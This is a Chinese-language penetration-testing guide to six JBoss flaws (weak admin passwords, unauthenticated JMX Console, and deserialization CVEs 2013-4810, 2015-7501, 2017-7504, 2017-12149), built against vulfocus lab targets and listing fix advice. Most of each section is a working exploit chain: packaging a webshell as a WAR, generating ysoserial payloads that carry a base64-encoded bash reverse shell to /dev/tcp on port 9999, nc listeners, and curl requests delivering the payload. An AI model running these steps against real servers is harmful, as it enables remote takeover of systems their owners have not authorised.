* [0x01 Administration Console 弱口令](#0x01-administration-console-弱口令)
  * [漏洞简介](#漏洞简介)
  * [影响版本](#影响版本)
  * [漏洞验证](#漏洞验证)
  * [漏洞利用](#漏洞利用)
  * [修复建议](#修复建议)
* [0x02 JMX Console 未授权访问漏洞](#0x02-jmx-console-未授权访问漏洞)
  * [漏洞简介](#漏洞简介-1)
  * [影响版本](#影响版本-1)
  * [漏洞验证](#漏洞验证-1)
  * [漏洞利用](#漏洞利用-1)
  * [修复建议](#修复建议-1)
* [0x03 JBoss EJBInvokerServlet 反序列化漏洞（CVE\-2013\-4810）](#0x03-jboss-ejbinvokerservlet-反序列化漏洞cve-2013-4810)
  * [漏洞简介](#漏洞简介-2)
  * [影响版本](#影响版本-2)
  * [漏洞检测](#漏洞检测)
  * [漏洞利用](#漏洞利用-2)
  * [修复建议](#修复建议-2)
* [0x04 jboss 反序列化 （CVE\-2015\-7501）](#0x04-jboss-反序列化-cve-2015-7501)
  * [漏洞简介](#漏洞简介-3)
  * [影响版本](#影响版本-3)
  * [环境搭建](#环境搭建)
  * [漏洞检测](#漏洞检测-1)
  * [漏洞利用](#漏洞利用-3)
  * [修复建议](#修复建议-3)
* [0x05 jboss 反序列化 （CVE\-2017\-7504）](#0x05-jboss-反序列化-cve-2017-7504)
  * [漏洞简介](#漏洞简介-4)
  * [影响版本](#影响版本-4)
  * [环境搭建](#环境搭建-1)
  * [漏洞利用](#漏洞利用-4)
  * [修复建议](#修复建议-4)
* [0x06 jboss 代码执行 (CVE\-2017\-12149)](#0x06-jboss-代码执行-cve-2017-12149)
  * [漏洞简介](#漏洞简介-5)
  * [影响版本](#影响版本-5)
  * [环境搭建](#环境搭建-2)
  * [漏洞利用](#漏洞利用-5)
  * [修复建议](#修复建议-5)

------

### 0x01 Administration Console 弱口令

#### 漏洞简介

```php
Administration Console 管理页面存在弱口令，登录后台可以上传 war 
```



#### 影响版本

```
jboss全版本
```



#### 漏洞验证

1、允许访问administrator Console页面

2、用户密码为弱口令



#### 漏洞利用

1、admin/admin 弱口令登录，点击 add a new resource 上传 war 包

![image-20220106031026447](image/jboss/image-20220106031026447.png)

2、将Webshell木马打包成war包，将其上传到目标服务器上

```
jar -cvf shell.war ./shell.jsp
```

![image-20220106032908137](image/jboss/image-20220106032908137.png)

![image-20220106031447981](image/jboss/image-20220106031447981.png)

3、冰蝎成功连接Webshell

```
连接url：http://192.168.0.1:8081/shell/shell.jsp
```

![image-20220106032840627](image/jboss/image-20220106032840627.png)



#### 修复建议

（1）修改密码，密码文件路径为

```
C:\jboss-6.1.0.Final\server\default\conf\props\jmx-console-users.properties
```

（2）删除 Administration Console 页面



------

### 0x02 JMX Console 未授权访问漏洞

#### 漏洞简介

```php
访问控制不严导致的漏洞，默认情况下访问ip:8080/jmx-console就可以访问管理控制台，不需要输入用户名和密码就可以直接浏览 JBoss 的部署管理的信息，部署上传木马，存在安全隐患。
```



#### 影响版本

```php
jboss全版本
```



#### 漏洞验证

1、允许未授权访问jmx-console页面

![image-20220106033330751](image/jboss/image-20220106033330751.png)



#### 漏洞利用

1、将Webshell木马打包成war包，并用python开启一个简易版的http服务器

```
jar -cvf shell.war ./shell.jsp
python3 -m http.server 8000
```

![image-20220106033620431](image/jboss/image-20220106033620431.png)

2、进入 JXM Console 之后，找到 jboss.system，然后点击service=MainDeployer

![image-20220106034959173](image/jboss/image-20220106034959173.png)

3、找到methodIndex为17 or 19的deploy，把远程的war包填入进去，进行远程war包的部署

![image-20220106035121385](image/jboss/image-20220106035121385.png)

![image-20220106035135468](image/jboss/image-20220106035135468.png)

4、部署完成之后，冰蝎成功连接Webshell

```
连接url：http://192.168.0.1:8081/shell/shell.jsp
```

![image-20220106034826978](image/jboss/image-20220106034826978.png)



#### 修复建议

1、关闭 jmx-console 和 web-console，提高安全性。



------

### 0x03 JBoss EJBInvokerServlet 反序列化漏洞（CVE-2013-4810）

#### 漏洞简介

```php
  此漏洞和CVE-2015-7501漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中JMXInvokerServlet和EJBInvokerServlet利用的是org.jboss.invocation.MarshalledValue进行的反序列化操作，而web-console/Invoker利用的是org.jboss.console.remote.RemoteMBeanInvocation进行反序列化并上传构造的文件。
```



#### 影响版本

```php
jboss 6.x 版本
```



#### 漏洞检测

```php
http://192.168.0.1:57792/invoker/JMXInvokerServlet
```

此漏洞存在于JBoss中/invoker[JMXInvokerServlet 路径。访问若提示下载 JMXInvokerServlet，则可能存在漏洞。

![image-20220106014702393](image/jboss/image-20220106014702393.png)



#### 漏洞利用

1、构造bash反弹shell的Payload，由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，我们需要用进行一次编码。

编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html

![image-20220106014914177](image/jboss/image-20220106014914177.png)

2、序列化数据生成，利用ysoserial.jar包的CommonsCollections5链把要执行的反弹shell生成一个ser文件

下载地址：https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}" > shell.ser
```

![image-20220106015837208](image/jboss/image-20220106015837208.png)

3、本地监听9999端口（需要和上面反弹shell的端口一致）

```bash
nc -lvvp 9999
```

![image-20220106020038164](image/jboss/image-20220106020038164.png)

4、使用curl来进行发包，成功反弹SHELL

```bash
curl http://192.168.0.1:8080/invoker/EJBInvokerServlet --data-binary @shell.ser
```

![image-20220106020255219](image/jboss/image-20220106020255219.png)

![image-20220106020321315](image/jboss/image-20220106020321315.png)



#### 修复建议

1. 删除`http-invoker.sar`组件

2. 设置`http-invoker`

   ```java
   XML
   jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml
   
   在security-constraint 标签中添加以下代码
   <url-pattern>/*</url-pattern>
   ```

3. 升级JBoss版本





------

### 0x04 jboss 反序列化 （CVE-2015-7501）

#### 漏洞简介

```php
这是经典的JBoss反序列化漏洞，JBoss在/invoker/JMXInvokerServlet请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。
```



#### 影响版本

```php
JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10
JBoss AS (Wildly) 6 and earlier
JBoss A-MQ 6.2.0
JBoss Fuse 6.2.0
JBoss SOA Platform (SOA-P) 5.3.1
JBoss Data Grid (JDG) 6.5.0
JBoss BRMS (BRMS) 6.1.0
JBoss BPMS (BPMS) 6.1.0
JBoss Data Virtualization (JDV) 6.1.0
JBoss Fuse Service Works (FSW) 6.0.0
JBoss Enterprise Web Server (EWS) 2.1,3.0
```



#### 环境搭建

```php
环境: vulfocus jboss CVE-2015-7501
```



#### 漏洞检测

```php
http://192.168.0.1:57792/invoker/JMXInvokerServlet
```

此漏洞存在于JBoss中/invoker[JMXInvokerServlet 路径。访问若提示下载 JMXInvokerServlet，则可能存在漏洞。

![image-20220106014702393](image/jboss/image-20220106014702393.png)



#### 漏洞利用

1、构造bash反弹shell的Payload，由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，我们需要用进行一次编码。

编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html

![image-20220106014914177](image/jboss/image-20220106014914177.png)

2、序列化数据生成，利用ysoserial.jar包的CommonsCollections5链把要执行的反弹shell生成一个ser文件

下载地址：https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}" > shell.ser
```

![image-20220106015837208](image/jboss/image-20220106015837208.png)

3、本地监听9999端口（需要和上面反弹shell的端口一致）

```bash
nc -lvvp 9999
```

![image-20220106020038164](image/jboss/image-20220106020038164.png)

4、使用curl来进行发包，成功反弹SHELL

```bash
curl http://192.168.0.1:57792/invoker/JMXInvokerServlet --data-binary @shell.ser
```

![image-20220106020255219](image/jboss/image-20220106020255219.png)

![image-20220106020321315](image/jboss/image-20220106020321315.png)



#### 修复建议

目前厂商已经发布了升级补丁以修复这个[安全](http://8u.hn.cn/linuxaq/)问题，请到厂商的主页[下载](http://8u.hn.cn/linuxdown/)：

https://access.redhat.com/security/cve/cve-2015-7501



------

### 0x05 jboss 反序列化 （CVE-2017-7504）

#### 漏洞简介

```php
 Jboss AS 4.x及之前版本中,JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞,远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
```



#### 影响版本

```php
Red Hat JBoss Application Server <=4.x
```



#### 环境搭建

```php
环境: vulfocus jboss CVE-2017-7504
```



#### 漏洞利用

1、下载漏洞利用工具，编译并生成序列化数据

JavaDeserH2HC：https://github.com/joaomatosf/JavaDeserH2HC

```php
git clone https://github.com/joaomatosf/JavaDeserH2HC.git
cd JavaDeserH2HC/
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
```

![image-20220106021751273](image/jboss/image-20220106021751273.png)

2、设置反弹IP和端口

```php
java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >& /dev/tcp/192.168.0.1/9999 0>&1"
```

![image-20220106021846079](image/jboss/image-20220106021846079.png)

3、服务器运行nc监听

```php
nc -lvp 9999
```

![image-20220106021918928](image/jboss/image-20220106021918928.png)

4、使用curl来进行发包，成功反弹SHELL

```bash
curl http://192.168.0.1:60581/jboss/mq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

![image-20220106022002961](image/jboss/image-20220106022002961.png)

![image-20220106022038320](image/jboss/image-20220106022038320.png)



#### 修复建议

1、升级jboss为高版本

2、删除**/jboss/mq-httpil/HTTPServerILServlet**接口





------

### 0x06 jboss 代码执行 (CVE-2017-12149)

#### 漏洞简介

```php
  该漏洞为Java反序列化错误类型,存在于jboss的HttpInvoker组件中的ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化,从而导致了漏洞。
```



#### 影响版本

```php
Jboss 5.x
Jboss 6.x
```



#### 环境搭建

```php
环境: vulfocus jboss CVE-2017-12149
```



#### 漏洞利用

1、下载漏洞利用工具，编译并生成序列化数据

JavaDeserH2HC：https://github.com/joaomatosf/JavaDeserH2HC

```php
git clone https://github.com/joaomatosf/JavaDeserH2HC.git
cd JavaDeserH2HC/
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
```

![image-20220106021751273](image/jboss/image-20220106021751273.png)

2、设置反弹IP和端口

```php
java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >& /dev/tcp/192.168.0.1/9999 0>&1"
```

![image-20220106021846079](image/jboss/image-20220106021846079.png)

3、服务器运行nc监听

```php
nc -lvp 9999
```

![image-20220106021918928](image/jboss/image-20220106021918928.png)

4、使用curl来进行发包，成功反弹SHELL

```bash
curl http://192.168.0.1:8081/invoker/readonly --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

![image-20220106023215993](image/jboss/image-20220106023215993.png)

![image-20220106022038320](image/jboss/image-20220106022038320.png)



#### 修复建议

1、升级至不受影响的版本。
2、删除http-invoker.sar 组件。
3、添加如下代码至 http-invoker.sar 下 web.xml的security-constraint 标签中：/*用于对 http invoker 组件进行访问控制。



